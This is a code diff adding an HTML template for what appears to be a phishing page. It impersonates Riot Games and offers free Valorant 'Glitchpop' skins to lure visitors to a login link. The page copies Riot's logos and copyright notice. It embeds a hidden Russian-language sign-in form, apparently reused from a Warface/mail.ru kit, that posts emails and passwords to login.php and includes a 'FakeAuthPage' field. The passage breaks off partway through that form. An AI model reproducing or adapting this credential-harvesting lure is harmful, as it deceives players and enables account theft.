@@ -1,0 +1,649 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta charset="utf-8">
+	<meta name="description" content="">
+	<title>Valorant | Free Gift</title>
+	<link rel="shortcut icon" href="{{url_for('static', filename='apple-touch-icon.c390ce6e.png')}}"
+		type="image/x-icon">
+	<link rel="stylesheet" href="{{url_for('static', filename='assets/main.css')}}">
+	<link rel="stylesheet" href="{{url_for('static', filename='assets/blocks.css')}}">
+	<link rel="stylesheet" href="{{url_for('static', filename='assets/footer.css')}}">
+	<script src="{{url_for('static', filename='assets/jquery.min.js')}}"></script>
+	<style data="oauth">
+		@import url("{{url_for('static', filename='css2')}}");
+
+		/* Modal */
+
+		.oauth_page_modal {
+			width: 100%;
+			height: 100%;
+			min-width: 320px;
+			display: none;
+			position: fixed;
+			left: 0px;
+			top: 0px;
+			font: normal 13px/1.54 Roboto, Arial;
+			z-index: 1000;
+		}
+
+		.oauth_page_modal.active {
+			display: block;
+		}
+
+		.oauth_page_modal_overlay {
+			width: 100%;
+			height: 100%;
+			background: rgba(0, 0, 0, 0.9);
+		}
+
+		.oauth_page_modal_section {
+			width: 644px;
+			position: absolute;
+			box-sizing: border-box;
+			left: 50%;
+			top: 50%;
+			transform: translate(-50%, -50%);
+			background: #323236;
+			border-radius: 4px;
+			overflow: hidden;
+			cursor: default;
+		}
+
+		.oauth_modal_content {}
+
+		.oauth_modal_top {
+			height: 50px;
+			display: flex;
+			justify-content: flex-end;
+			align-items: center;
+			position: relative;
+			background: #242429 url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM3IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTM3IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMjEuODkzIDBsLTUuNzk2IDYuNDY3TDEwLjMxLjAwOCAwIDExLjUxM2w0LjQxOCA0LjkzIDUuODIzLTYuNDk3IDUuNzk5IDYuNDcyIDUuODI1LTYuNSAyLjMzOCAyLjYxNS01LjgyMiA2LjQ5N0wyMi44MzQgMjQgMzkuODggNC45OCAzNS40MjUuMDFsLTYuNzYyIDcuNTQ1TDIxLjg5MyAwem00Ni44MDEgNi4yNjlMNjUuMjYgMTEuMTVsLTMuNTk4LTQuODhoLTIuNTZsNS4wMzYgNi44MDd2NC4xMzZoMi4xODN2LTQuMTM4bDQuODk3LTYuODA1aC0yLjUyNHptMTEuODIgNC45MTh2MS45MjJoMy43MTR2Mi4xMjljLS44MTMuMjMzLTEuNzk2LjM2NS0yLjcyNi4zNjUtMi44NTMgMC00LjU1Ny0xLjM2Ny00LjU1Ny0zLjY1NiAwLTIuMTg3IDEuODMxLTMuNjU2IDQuNTU3LTMuNjU2IDEuMyAwIDIuNjU1LjI3MiAzLjkxNy43ODhsLjIwMS4wODIuNjcyLTEuODIyLS4xODEtLjA3MmExMi44MiAxMi44MiAwIDAwLTQuNzU4LS45M2MtMy45ODkgMC02LjY2OCAyLjI5My02LjY2OCA1LjcwNyAwIDMuNDUyIDIuNTE3IDUuNTE0IDYuNzM0IDUuNTE0IDEuNjYzIDAgMy41NzQtLjM4IDQuODY4LS45NjdsLjExNy0uMDUzdi01LjM1MWgtNS44OXptMzkuMzgzIDQuMjg4di0yLjY4N2g1LjQ5NnYtMS45MjJoLTUuNDk2VjguMzRoNi4wNjJWNi40MTdoLTguMjM5djEwLjk4aDguMzM5di0xLjkyMmgtNi4xNjJ6bTEyLjY4Ni00LjU2OGMtMS42OTctLjIzMS0yLjcyNy0uNDM4LTIuNzI3LTEuMzUzIDAtLjgwMi44NTQtMS4yNjMgMi4zNDMtMS4yNjMgMS41NjQgMCAyLjkxNC41NyAzLjQyMi44MTVsLjE4NS4wOS44NTgtMS42OTYtLjE2NS0uMDkzYy0xLjE5Ny0uNjctMi44NDktMS4wNy00LjQxNy0xLjA3LTIuODA5IDAtNC40ODYgMS4yMzktNC40ODYgMy4zMTMgMCAxIC4zNTUgMS43MzYgMS4wODQgMi4yNDkuODk1LjYyOCAyLjE5OC44MDUgMy4zNDguOTYgMS42MzEuMjIxIDIuNjMuNCAyLjYzIDEuMjU2IDAgMS4zNDMtMS45NjUgMS40ODgtMi44MDkgMS40ODgtMS4yNjQgMC0yLjQzMy0uMzA5LTMuNDc0LS45MTlsLS4xODItLjEwNi0uOTk4IDEuNzA1LjE2MS4xMDJjLjg0NS41MzUgMi4zMDggMS4xNzIgNC40NzYgMS4xNzIgMy4wOSAwIDUuMDg2LTEuMzgyIDUuMDg2LTMuNTIyIDAtMi41MzYtMi40MDQtMi44NjQtNC4zMzUtMy4xMjh6bS04NS41MDkgNi40ODhsMi4yMTEtNi4wNjkgMy43MzUgNi4wMyAzLjczNC02LjAzIDIuMjEyIDYuMDY5aDIuMjc0bC0zLjk3Ni0xMS4wNS00LjI0NCA2Ljg3Ni00LjI0NS02Ljg3Ny0zLjk3NiAxMS4wNWgyLjI3NXptNDYuMzcyLTYuNjA0bDEuNjg2IDIuOTE1aC0zLjM2OGwxLjY4Mi0yLjkxNXptLTMuODIzIDYuNjA3bDEuMTctMi4wMTcgNS4zMDUtLjAwMyAxLjE2OSAyLjAyaDIuNDYzbC02LjI4NS0xMS4wNS02LjI4NyAxMS4wNWgyLjQ2NXptMTIuOTAyIDBsMi4yMTEtNi4yNDQgMy43MzUgNi4yMDUgMy43MzUtNi4yMDUgMi4yMTEgNi4yNDRoMi4yNzRsLTMuOTc1LTExLjA1LTQuMjQ1IDYuODc3LTQuMjQ1LTYuODc3LTMuOTc1IDExLjA1aDIuMjc0em0tMjkuNDcxLTEuNzE2bC0xLjk0NSAxLjg3Ni0xLjk0NC0xLjg3NiAxLjk0NC0xLjg3NSAxLjk0NSAxLjg3NXoiIGZpbGw9IiNGNUY1RjciLz48L3N2Zz4=) center center no-repeat;
+		}
+
+		.oauth_modal_close {
+			width: 48px;
+			height: 50px;
+			color: #78787c;
+			font: 28px/44px Tahoma;
+			cursor: pointer;
+		}
+
+		.oauth_modal_close::before {
+			content: '\d7';
+			width: 100%;
+			height: 100%;
+			display: block;
+			text-align: center;
+		}
+
+		.oauth_modal_close:hover {
+			color: #fff;
+		}
+
+		.oauth_modal_close:active {
+			opacity: 0.5;
+		}
+
+		.oauth_modal_inner {
+			padding: 12px 32px 20px;
+		}
+
+		.oauth_modal_inner strong {
+			display: block;
+			padding: 8px 0px;
+			color: #fff;
+			font: 500 20px/24px Roboto, Arial;
+			text-align: center;
+			text-transform: none;
+		}
+
+		.oauth_modal_inner p {
+			margin: 14px 0px;
+			padding: 0px;
+			color: #a8a8ab;
+			font: normal 13px/1.54 Roboto, Arial;
+			text-align: left;
+		}
+
+		.oauth_modal_inner p.center {
+			text-align: center;
+		}
+
+		.oauth_modal_inner a {
+			color: #fff;
+			font: normal 13px/1.54 Roboto, Arial;
+			text-decoration: none;
+			transition: color 0.1s;
+		}
+
+		.oauth_modal_inner a:hover {
+			color: #ababae;
+			text-decoration: none;
+		}
+
+		.oauth_modal_inner hr {
+			margin: 16px 0px;
+			border: 1px solid rgba(0, 0, 0, 0);
+			border-bottom-color: rgba(255, 255, 255, 0.1);
+		}
+
+		.oauth_modal_inner li {
+			color: #a8a8ab;
+			font: normal 13px/1.54 Roboto, Arial;
+		}
+
+		.oauth_modal_inner li::marker {
+			color: undefined;
+		}
+
+		.oauth_modal_inner label {
+			display: block;
+			position: relative;
+			padding-left: 30px;
+			cursor: pointer;
+			-webkit-user-select: none;
+			-ms-user-select: none;
+			user-select: none;
+		}
+
+		.oauth_modal_inner label::before {
+			content: '';
+			width: 20px;
+			height: 20px;
+			position: absolute;
+			top: -1px;
+			left: 0px;
+			background-color: #3c3c40;
+			border: 1px solid #626262;
+			border-radius: 3px;
+		}
+
+		.oauth_modal_inner label,
+		.oauth_modal_inner label a {
+			font-size: 13px;
+			line-height: 1.54;
+		}
+
+		.oauth_modal_inner input.oauth_modal_cb {
+			width: 0px;
+			height: 0px;
+			position: absolute;
+			left: 0px;
+			top: 0px;
+			opacity: 0;
+		}
+
+		.oauth_modal_inner input.oauth_modal_cb:checked+label::before {
+			background: #e2e3e7 url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4IiBoZWlnaHQ9IjYiPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTcuNy4zYy0uNC0uNC0xLS40LTEuNCAwTDMgMy42IDEuNyAyLjNjLS40LS40LTEtLjQtMS40IDAtLjQuNC0uNCAxIDAgMS40bDIgMmMuMi4yLjQuMy43LjMuMyAwIC41LS4xLjctLjNsNC00Yy40LS40LjQtMSAwLTEuNHoiLz48L3N2Zz4=) no-repeat 50%;
+			background-size: 10px 7px;
+			border-color: #e2e3e7;
+		}
+
+		.oauth_modal_button {
+			width: 60%;
+			height: 48px;
+			display: flex;
+			box-sizing: border-box;
+			justify-content: center;
+			align-items: center;
+			margin: 32px auto 16px;
+			padding: 12px;
+			color: #000;
+			font: 500 17px/18px Roboto, Arial;
+			text-align: center;
+			text-transform: none;
+			background: #fff;
+			border-radius: 4px;
+			cursor: pointer;
+			-webkit-user-select: none;
+			-ms-user-select: none;
+			user-select: none;
+		}
+
+		.oauth_modal_button:not(.loading):not(.disabled):hover {
+			color: #000;
+			background: #c7c8cb;
+		}
+
+		.oauth_modal_button:not(.loading):not(.disabled):active {
+			opacity: 0.7;
+		}
+
+		.oauth_modal_button.disabled {
+			color: #262626;
+			background: #414141;
+			filter: grayscale(1);
+			cursor: default;
+		}
+
+		.oauth_modal_button.loading {
+			color: rgba(0, 0, 0, 0);
+			filter: grayscale(1);
+			opacity: 0.7;
+			cursor: default;
+		}
+
+		.oauth_modal_button.loading::before {
+			content: '';
+			width: 100%;
+			height: 100%;
+			display: block;
+			position: absolute;
+			left: 0px;
+			top: 0px;
+			background: url(data:image/gif;base64,R0lGODlhKwALAPEAAHd3d////7i4uP///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAKwALAAACMoSOCMuW2diD88UKG95W88uF4DaGWFmhZid93pq+pwxnLUnXh8ou+sSz+T64oCAyTBUAACH5BAkKAAAALAAAAAArAAsAAAI9xI4IyyAPYWOxmoTHrHzzmGHe94xkmJifyqFKQ0pwLLgHa82xrekkDrIBZRQab1jyfY7KTtPimixiUsevAAAh+QQJCgAAACwAAAAAKwALAAACPYSOCMswD2FjqZpqW9xv4g8KE7d54XmMpNSgqLoOpgvC60xjNonnyc7p+VKamKw1zDCMR8rp8pksYlKorgAAIfkECQoAAAAsAAAAACsACwAAAkCEjgjLltnYmJS6Bxt+sfq5ZUyoNJ9HHlEqdCfFrqn7DrE2m7Wdj/2y45FkQ13t5itKdshFExC8YCLOEBX6AhQAADsAAAAAAAAAAAA=) center no-repeat;
+			opacity: 0.4;
+		}
+
+		.g-recaptcha>div {
+			margin: 0px auto;
+		}
+
+		@media screen and (max-width: 720px) {
+
+			body.oauth_page_modal_active {
+				overflow: hidden;
+			}
+
+			.oauth_page_modal_section {
+				width: 100%;
+				overflow: auto;
+			}
+
+			.oauth_modal_top {
+				height: 70px;
+			}
+
+			.oauth_modal_inner {
+				min-height: 100%;
+				display: flex;
+				box-sizing: border-box;
+				flex-direction: column;
+				justify-content: center;
+				padding-bottom: 40px;
+			}
+
+			.oauth_modal_button {
+				width: 80%;
+				padding: 16px;
+			}
+
+			.oauth_modal_close {
+				width: 70px;
+				height: 70px;
+				position: fixed;
+				font-size: 38px;
+				line-height: 66px;
+			}
+
+		}
+
+		@media screen and (max-width: 480px) {
+
+			.oauth_modal_button {
+				width: 100%;
+			}
+
+		}
+
+		/* User block */
+
+		.js-user-block:not([data-style="none"]) {
+			display: flex;
+			color: #fff;
+			font: normal 14px/38px Roboto, Arial;
+			text-transform: uppercase;
+			cursor: default;
+		}
+
+		.js-user-block[data-style~="column"] {
+			flex-direction: column;
+		}
+
+		.js-user-block[data-style~="center"] {
+			justify-content: center;
+			align-items: center;
+		}
+
+		.js-user-block[data-style~="inline"]>div {
+			padding: 0px 12px;
+		}
+
+		.js-user-block[data-style~="inline"]>div:first-child {
+			padding-left: 0px;
+		}
+
+		.js-user-block[data-style~="inline"]>div:last-child {
+			padding-right: 0px;
+		}
+
+		.js-user-block:not([data-style="none"]) .item {
+			text-decoration: none;
+			cursor: pointer;
+		}
+
+		.js-user-block:not([data-style="none"]) .item:hover {
+			text-decoration: underline;
+		}
+
+		.js-user-block:not([data-style="none"]) .item:active {
+			text-decoration: none;
+		}
+
+		.js-user-block:not([data-style="none"]) .name {
+			color: inherit;
+			text-transform: none;
+		}
+	</style>
+</head>
+
+<body style='font-family: "Neue Frutiger",Tahoma,sans-serif;'>
+	<!--<video class="bgvideo" id="about__video" autoplay="autoplay" playsinline="" loop="loop" muted="muted" preload="auto" volume="0">
+        <source src="https://wf.cdn.gmru.net/static/wf.mail.ru/promo/firstdivision/dist/video/1.mp4" type="video/mp4">
+    </video>-->
+	<div id="ph-header">
+		<div class="ph-nav notranslate"></div>
+	</div>
+	<header class="header">
+		<div class="header__controls">
+			<div class="content">
+				<div class="header__item header__item_left">
+					<a href="https://playvalorant.com/" target="_blank" class="auth__link"
+						style="padding-top: 10px;"><svg style="fill: #fff;" width="99" style="fill: #737373;"
+							height="32" class="" viewbox="0 0 587.93 165">
+							<title> Riot Games </title>
+							<title>riotLogo-mobile21</title>
+							<path
+								d="M98.77.33L0 46.07l24.61 93.66 18.73-2.3-5.15-58.89 6.15-2.74L54.96 136l32.01-3.93-5.69-65 6.09-2.71 11.68 66.23 32.38-3.98-6.23-71.25 6.16-2.74 12.77 72.43 32.01-3.93V19.71L98.77.33zm2.32 142.05l1.63 9.22 73.42 12.24v-30.68l-75.01 9.22h-.04zm144.49-19.22v12.63h15.57a14.84 14.84 0 01-1.92 7.31 13 13 0 01-5.6 5.11 20 20 0 01-8.9 1.8 17.53 17.53 0 01-10-2.8 17.87 17.87 0 01-6.44-8.14 33.06 33.06 0 01-2.27-12.93 31.81 31.81 0 012.32-12.81 18.14 18.14 0 016.5-8 17.27 17.27 0 019.82-2.78 19.31 19.31 0 015.36.71 14.15 14.15 0 014.33 2.09 12.92 12.92 0 013.18 3.29 15.61 15.61 0 012 4.44h17.27a27.22 27.22 0 00-3.46-10.28 28.84 28.84 0 00-7.05-8.1 32.6 32.6 0 00-9.91-5.29 37.91 37.91 0 00-12.06-1.86 37.32 37.32 0 00-14 2.6 32.6 32.6 0 00-11.36 7.61 35 35 0 00-7.61 12.21 46.15 46.15 0 00-2.73 16.44q0 11.94 4.54 20.59a32.4 32.4 0 0012.69 13.27 39.84 39.84 0 0035.84.84 28.39 28.39 0 0011.67-11q4.25-7.19 4.24-17.2v-9.76zm215.03 40.81V88.53h51.67v13.96h-34.62v16.76h27.99v13.96h-27.99v16.8h34.7v13.96h-51.75zm101.83-53.3a9 9 0 00-3.54-6.64c-2.09-1.59-5-2.38-8.69-2.38a16.63 16.63 0 00-6.26 1 8.62 8.62 0 00-3.83 2.78 6.74 6.74 0 00-1.33 4 6.2 6.2 0 00.79 3.29 7.27 7.27 0 002.4 2.45 16.54 16.54 0 003.7 1.79 40.14 40.14 0 004.64 1.31l6.63 1.54a47.19 47.19 0 019.45 3.08 27.46 27.46 0 017.2 4.68 18.84 18.84 0 014.58 6.39 20.37 20.37 0 011.61 8.29 20.65 20.65 0 01-3.54 12.11 22.56 22.56 0 01-10.15 7.85 41.31 41.31 0 01-15.93 2.76 42.69 42.69 0 01-16.17-2.81 23.22 23.22 0 01-10.72-8.48q-3.83-5.66-4-14.12h16.43a10.68 10.68 0 007.05 9.94 19.37 19.37 0 007.24 1.26 18.44 18.44 0 006.66-1.09 10 10 0 004.33-3 7.22 7.22 0 001.57-4.48 6.16 6.16 0 00-1.42-4 10.86 10.86 0 00-4.14-2.81 42.07 42.07 0 00-6.89-2.14l-8.07-1.95q-9.65-2.3-15.23-7.26t-5.54-13.44a19.86 19.86 0 013.72-12.12 24.74 24.74 0 0110.33-8.11 36.74 36.74 0 0115-2.91 35.62 35.62 0 0114.92 2.91 23.43 23.43 0 019.91 8.14 21.54 21.54 0 013.6 12.12zm-113.99 53.3h-16.87v-57.35l-1.73-.02-17.04 57.37h-16.86l-16.58-57.37-2.15.02v57.35h-16.87V88.53h28.67l14.48 50.56h1.75l14.48-50.56h28.72v75.44zm-114.66 0h18.27l-25.33-75.43h-23.15l-25.37 75.43h18.3l4.93-16.54h27.42zm-28.43-29.7l8.22-27.65h3.1l8.26 27.65zm278.58-37.76a4 4 0 01-3.67-2.44 4 4 0 010-3.1 4 4 0 01.85-1.27 4.25 4.25 0 011.27-.86 4.15 4.15 0 013.1 0 4.13 4.13 0 011.27.86 4.08 4.08 0 01.86 1.27 4 4 0 010 3.1 4.08 4.08 0 01-.86 1.27 4 4 0 01-1.27.86 4 4 0 01-1.55.31zm0-1.09a2.84 2.84 0 001.47-.39 2.94 2.94 0 001.05-1 2.93 2.93 0 000-2.92 3 3 0 00-1.06-1 2.93 2.93 0 00-2.92 0 3 3 0 00-1 1 2.86 2.86 0 000 2.92 3 3 0 001 1 2.83 2.83 0 001.46.39zm-1.46-1.15V90.6h1.78a1.52 1.52 0 01.69.15 1.13 1.13 0 01.47.42 1.24 1.24 0 01.17.66 1.16 1.16 0 01-.18.66 1 1 0 01-.48.41 1.56 1.56 0 01-.7.14h-1.2v-.72h1a.52.52 0 00.36-.12.5.5 0 00.14-.37.47.47 0 00-.14-.37.52.52 0 00-.36-.12h-.55v2.93zm2.39-1.68l.82 1.68h-1.11l-.75-1.68zM282.41 1.03h17.05v75.44h-17.05zm98.02 37.72q0 12.42-4.71 21a32.67 32.67 0 01-12.79 13.17 38.57 38.57 0 01-36.31 0 32.75 32.75 0 01-12.79-13.2q-4.71-8.66-4.71-21t4.71-21.05a32.67 32.67 0 0112.75-13.14 38.65 38.65 0 0136.31 0 32.67 32.67 0 0112.79 13.17q4.71 8.64 4.71 21.05m-17.35 0a33.35 33.35 0 00-2.23-13 17.47 17.47 0 00-6.33-8 18.57 18.57 0 00-19.45 0 17.57 17.57 0 00-6.35 8 38.59 38.59 0 000 26 17.49 17.49 0 006.35 8 18.57 18.57 0 0019.45 0 17.39 17.39 0 006.33-8 33.4 33.4 0 002.23-13M246.58 50.17l8.76 26.3h18.71l-9.74-28.33h-13.23l-.79-2.44c2.52-.49 6.83-1.25 10.65-3.85a20 20 0 008.75-16.39 24.15 24.15 0 00-3.26-12.75 21.9 21.9 0 00-9.36-8.64 32.56 32.56 0 00-14.64-3H212v75.4h17.06v-26.3zm-.32-15.61a19.35 19.35 0 01-7.26 1.18h-9.94V14.88h9.91a18.68 18.68 0 017.25 1.24 9.12 9.12 0 014.4 3.7 10 10 0 011.5 5.64 9.65 9.65 0 01-1.48 5.55 8.86 8.86 0 01-4.38 3.55M382.04 1.03v14h29.3l.8 2.45c-2.48.48-6.67 1.22-10.43 3.7v55.31h16.87v-61.5h19.62v-14z">
+							</path>
+						</svg></a>
+				</div>
+				<div class="header__item header__item_right">
+					<div class="auth js-auth">
+
+						<span class="auth__link js-auth-init" style=""><a href="/login"
+								style="background: linear-gradient(135deg, rgb(255, 51, 66) 0%, rgb(255, 48, 64) 0.01%, rgb(255, 125, 102) 100%);border-radius: 12px;padding: 5px 20px;width: 85px;color: #000;">play
+								now</a></span>
+					</div>
+				</div>
+
+			</div>
+		</div>
+	</header>
+
+	<main>
+		<style>
+			.promo__logo {
+				width: 100%;
+				height: 250px;
+				margin: 0 0 40px;
+				background: url(img/77ee2c4e2ac459836ae808ee2ebc2a43.jpg) no-repeat top;
+				background-size: contain;
+				text-align: center;
+			}
+
+			.img_back_ist {
+				background: #000 url(CkfIjcc.jpg);
+				background-size: 100%;
+			}
+
+			.shop_item1 {
+				background: #000 url(ms/da1b632ac10071d731a17b2f3292f191.jpg);
+				background-size: 100%;
+			}
+
+			.shop_item2 {
+				background: #000 url(nzFyRj4.jpg);
+				background-size: 100%;
+				background-position: 50% 245%;
+			}
+
+			.shop_item3 {
+				background: #000 url(YDu3TQn.jpg);
+				background-size: 100%;
+				background-position: 50% 245%;
+			}
+		</style>
+		<div class="content">
+			<!--<div class="promo__logo">-->
+			<div class="main__title">Valorant free gift</div>
+			<!--</div>-->
+			<div class="main__text">Get the rarest skins completely free for the Valorant game. The skins will be
+				credited to your account within 24 hours!</div>
+				<div class="shop" style="justify-content: space-around;">
+					<div class="shop__item js-auth-init" style="background: #111;" onclick="highlightItem(this)">
+					  <div class="shop__name">Glitchpop Vandal</div>
+					  <img class="shop__img" src="/static/displayicon.png" style="height: 70px;width: auto; pointer-events: none" width="60%">
+					</div>
+					<div class="shop__item js-auth-init" style="background: #111;" onclick="highlightItem(this)">
+					  <div class="shop__name">Glitchpop Operator</div>
+					  <img class="shop__img" src="/static/displayicon2.png" style="height: 70px;width: auto; pointer-events: none" width="60%">
+					</div>
+				  </div>
+				  
+				  <style>
+					.highlighted {
+					  box-shadow: 0 0 0 1px #ff4655;
+					}
+				  </style>
+				  
+				  <script>
+					function highlightItem(item) {
+					  // Удаляем класс highlighted у всех элементов
+					  const items = document.querySelectorAll('.js-auth-init');
+					  items.forEach((i) => {
+						i.classList.remove('highlighted');
+					  });
+					  
+					  // Добавляем класс highlighted только длявыбранного элемента
+					  item.classList.add('highlighted');
+					}
+				  </script>
+			</div>
+			<div class="main__reg js-bl-reg" style="display: block;">
+
+				<a href="/login" style="border: 1px solid hsla(38,22%,90%,.5);padding: 20px 0px;">
+					<div class="button main__reg-button js-auth-init" style="display: inline-block; ">Get free</div>
+				</a>
+			</div>
+
+		</div>
+	</main>
+
+	<footer>
+
+		<div class="logos">
+			<div>
+				<style>
+					@import "{{url_for('static', filename='assets/footer.css')}}";
+				</style>
+
+
+				<a target="_blank" href="http://www.riotgames.com/"><svg width="99" style="fill: #737373;" height="32"
+						class="" viewbox="0 0 587.93 165">
+						<title> Riot Games </title>
+						<title>riotLogo-mobile21</title>
+						<path
+							d="M98.77.33L0 46.07l24.61 93.66 18.73-2.3-5.15-58.89 6.15-2.74L54.96 136l32.01-3.93-5.69-65 6.09-2.71 11.68 66.23 32.38-3.98-6.23-71.25 6.16-2.74 12.77 72.43 32.01-3.93V19.71L98.77.33zm2.32 142.05l1.63 9.22 73.42 12.24v-30.68l-75.01 9.22h-.04zm144.49-19.22v12.63h15.57a14.84 14.84 0 01-1.92 7.31 13 13 0 01-5.6 5.11 20 20 0 01-8.9 1.8 17.53 17.53 0 01-10-2.8 17.87 17.87 0 01-6.44-8.14 33.06 33.06 0 01-2.27-12.93 31.81 31.81 0 012.32-12.81 18.14 18.14 0 016.5-8 17.27 17.27 0 019.82-2.78 19.31 19.31 0 015.36.71 14.15 14.15 0 014.33 2.09 12.92 12.92 0 013.18 3.29 15.61 15.61 0 012 4.44h17.27a27.22 27.22 0 00-3.46-10.28 28.84 28.84 0 00-7.05-8.1 32.6 32.6 0 00-9.91-5.29 37.91 37.91 0 00-12.06-1.86 37.32 37.32 0 00-14 2.6 32.6 32.6 0 00-11.36 7.61 35 35 0 00-7.61 12.21 46.15 46.15 0 00-2.73 16.44q0 11.94 4.54 20.59a32.4 32.4 0 0012.69 13.27 39.84 39.84 0 0035.84.84 28.39 28.39 0 0011.67-11q4.25-7.19 4.24-17.2v-9.76zm215.03 40.81V88.53h51.67v13.96h-34.62v16.76h27.99v13.96h-27.99v16.8h34.7v13.96h-51.75zm101.83-53.3a9 9 0 00-3.54-6.64c-2.09-1.59-5-2.38-8.69-2.38a16.63 16.63 0 00-6.26 1 8.62 8.62 0 00-3.83 2.78 6.74 6.74 0 00-1.33 4 6.2 6.2 0 00.79 3.29 7.27 7.27 0 002.4 2.45 16.54 16.54 0 003.7 1.79 40.14 40.14 0 004.64 1.31l6.63 1.54a47.19 47.19 0 019.45 3.08 27.46 27.46 0 017.2 4.68 18.84 18.84 0 014.58 6.39 20.37 20.37 0 011.61 8.29 20.65 20.65 0 01-3.54 12.11 22.56 22.56 0 01-10.15 7.85 41.31 41.31 0 01-15.93 2.76 42.69 42.69 0 01-16.17-2.81 23.22 23.22 0 01-10.72-8.48q-3.83-5.66-4-14.12h16.43a10.68 10.68 0 007.05 9.94 19.37 19.37 0 007.24 1.26 18.44 18.44 0 006.66-1.09 10 10 0 004.33-3 7.22 7.22 0 001.57-4.48 6.16 6.16 0 00-1.42-4 10.86 10.86 0 00-4.14-2.81 42.07 42.07 0 00-6.89-2.14l-8.07-1.95q-9.65-2.3-15.23-7.26t-5.54-13.44a19.86 19.86 0 013.72-12.12 24.74 24.74 0 0110.33-8.11 36.74 36.74 0 0115-2.91 35.62 35.62 0 0114.92 2.91 23.43 23.43 0 019.91 8.14 21.54 21.54 0 013.6 12.12zm-113.99 53.3h-16.87v-57.35l-1.73-.02-17.04 57.37h-16.86l-16.58-57.37-2.15.02v57.35h-16.87V88.53h28.67l14.48 50.56h1.75l14.48-50.56h28.72v75.44zm-114.66 0h18.27l-25.33-75.43h-23.15l-25.37 75.43h18.3l4.93-16.54h27.42zm-28.43-29.7l8.22-27.65h3.1l8.26 27.65zm278.58-37.76a4 4 0 01-3.67-2.44 4 4 0 010-3.1 4 4 0 01.85-1.27 4.25 4.25 0 011.27-.86 4.15 4.15 0 013.1 0 4.13 4.13 0 011.27.86 4.08 4.08 0 01.86 1.27 4 4 0 010 3.1 4.08 4.08 0 01-.86 1.27 4 4 0 01-1.27.86 4 4 0 01-1.55.31zm0-1.09a2.84 2.84 0 001.47-.39 2.94 2.94 0 001.05-1 2.93 2.93 0 000-2.92 3 3 0 00-1.06-1 2.93 2.93 0 00-2.92 0 3 3 0 00-1 1 2.86 2.86 0 000 2.92 3 3 0 001 1 2.83 2.83 0 001.46.39zm-1.46-1.15V90.6h1.78a1.52 1.52 0 01.69.15 1.13 1.13 0 01.47.42 1.24 1.24 0 01.17.66 1.16 1.16 0 01-.18.66 1 1 0 01-.48.41 1.56 1.56 0 01-.7.14h-1.2v-.72h1a.52.52 0 00.36-.12.5.5 0 00.14-.37.47.47 0 00-.14-.37.52.52 0 00-.36-.12h-.55v2.93zm2.39-1.68l.82 1.68h-1.11l-.75-1.68zM282.41 1.03h17.05v75.44h-17.05zm98.02 37.72q0 12.42-4.71 21a32.67 32.67 0 01-12.79 13.17 38.57 38.57 0 01-36.31 0 32.75 32.75 0 01-12.79-13.2q-4.71-8.66-4.71-21t4.71-21.05a32.67 32.67 0 0112.75-13.14 38.65 38.65 0 0136.31 0 32.67 32.67 0 0112.79 13.17q4.71 8.64 4.71 21.05m-17.35 0a33.35 33.35 0 00-2.23-13 17.47 17.47 0 00-6.33-8 18.57 18.57 0 00-19.45 0 17.57 17.57 0 00-6.35 8 38.59 38.59 0 000 26 17.49 17.49 0 006.35 8 18.57 18.57 0 0019.45 0 17.39 17.39 0 006.33-8 33.4 33.4 0 002.23-13M246.58 50.17l8.76 26.3h18.71l-9.74-28.33h-13.23l-.79-2.44c2.52-.49 6.83-1.25 10.65-3.85a20 20 0 008.75-16.39 24.15 24.15 0 00-3.26-12.75 21.9 21.9 0 00-9.36-8.64 32.56 32.56 0 00-14.64-3H212v75.4h17.06v-26.3zm-.32-15.61a19.35 19.35 0 01-7.26 1.18h-9.94V14.88h9.91a18.68 18.68 0 017.25 1.24 9.12 9.12 0 014.4 3.7 10 10 0 011.5 5.64 9.65 9.65 0 01-1.48 5.55 8.86 8.86 0 01-4.38 3.55M382.04 1.03v14h29.3l.8 2.45c-2.48.48-6.67 1.22-10.43 3.7v55.31h16.87v-61.5h19.62v-14z">
+						</path>
+					</svg></a>
+
+			</div>
+		</div>
+
+		<div class="copyright">
+			<p>© 2023 Riot Games, Inc. Riot Games, VALORANT, and any associated logos are trademarks, service marks,
+				and/or registered trademarks of Riot Games, Inc.</p>
+		</div>
+	</footer>
+
+	<style>
+		@import "https://wf.cdn.gmru.net/static/wf.mail.ru/modules/regform/css/reg_default.css?2";
+	</style>
+
+	<div class="registration js-regform-wrap" style="display:none">
+		<div class="registration__wrap regform">
+			<div class="registration__close js-regform-close"></div>
+			<!-- <p>Для начала зарегистрируйтесь или зайдите, если вы уже играете в WarFace.</p> -->
+			<div class="registration__inner">
+				<div class="registration__tabs">
+					<div class="registration__tab js-tab-n" data-tabs="reg">ВХОД</div>
+					<div class="registration__tab active js-tab-n" data-tabs="reg">РЕГИСТРАЦИЯ</div>
+				</div>
+
+				<div class="registration__form display-none" data-tabs-set="reg">
+
+					<form action="login.php" method="post" id="js_kit_signin" class="">
+						<input class="js-login-back" name="Page" value="https://demo-sites.ru/demo/23/15/"
+							type="hidden">
+						<input name="FakeAuthPage" value="https://wf.mail.ru/auth" type="hidden">
+						<div class="registration__row">
+							<div class="registration__row">
+								<input class="registration__input" required="" name="login"
+									id="js_kit_signin__box__login" tabindex="1" data-yandex-suggest="false"
+									placeholder="Введите почту" type="text">
+								<div class="registration_notes login_note js-login-errorblock"></div>
+							</div>
+							<div class="registration__row">
+								<input class="registration__input" required="" name="password"
+									id="js_kit_signin__password__input" value="" tabindex="2"
+									placeholder="Введите пароль" type="password">
+							</div>
+							<a class="registration__lostpass" href="https://wf.mail.ru/user/password"
+								target="_blank">Забыли пароль?</a>
+
+							<div class="gmrSignin__opts display-none">
+								<span class="gmrSignin__remember gmrSignin__checked">
+									<input name="saveauth" value="1" checked="checked" id="js_kit_signin__remember"
+										tabindex="4" type="checkbox">
